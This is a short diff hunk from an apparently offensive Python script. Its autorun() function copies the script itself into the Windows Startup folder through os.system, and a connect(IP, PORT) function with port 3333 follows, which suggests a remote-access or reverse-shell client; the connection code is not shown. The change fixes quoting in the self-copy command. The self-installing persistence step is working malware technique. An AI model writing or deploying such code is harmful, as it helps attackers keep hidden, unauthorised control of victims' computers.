@@ -9,7 +9,8 @@ PORT = 3333
 
 def autorun():
     filename = os.path.basename(__file__)
-    os.system('copy {} \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programas\\StartUp\"'.format(filename))
+    print(filename)
+    os.system("copy \"{}\" \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programas\\StartUp\"".format(filename))
 
 def connect(IP, PORT):
     try:
